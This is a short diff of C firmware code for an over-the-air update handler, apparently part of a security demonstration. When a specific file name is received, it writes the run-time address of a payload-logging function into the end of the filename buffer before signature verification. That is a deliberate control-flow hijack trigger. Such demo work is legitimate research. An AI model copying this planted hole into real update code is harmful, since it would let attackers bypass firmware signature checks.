@@ -141,10 +141,12 @@ void Receive_And_Process_One_OTA_Request(ed25519_key *pk)
         // LMCO
         if (strcmp (tftp_filename, "lmcodemo.htm.sig") == 0)
         {
-            tftp_filename[159] = 0xc0;
-            tftp_filename[158] = 0x01;
-            tftp_filename[157] = 0xcb;
-            tftp_filename[156] = 0xe0;
+            intptr_t wptl = (intptr_t) Write_Payload_To_Log;
+            fettPrintf ("Address of Write_Payload_To_Log is %p\n", wptl);
+            tftp_filename[159] = ((wptl >> 24) & 0xff);
+            tftp_filename[158] = ((wptl >> 16) & 0xff);
+            tftp_filename[157] = ((wptl >> 8) & 0xff);
+            tftp_filename[156] = (wptl & 0xff);
         }
 
         r = wc_ed25519_verify_msg(
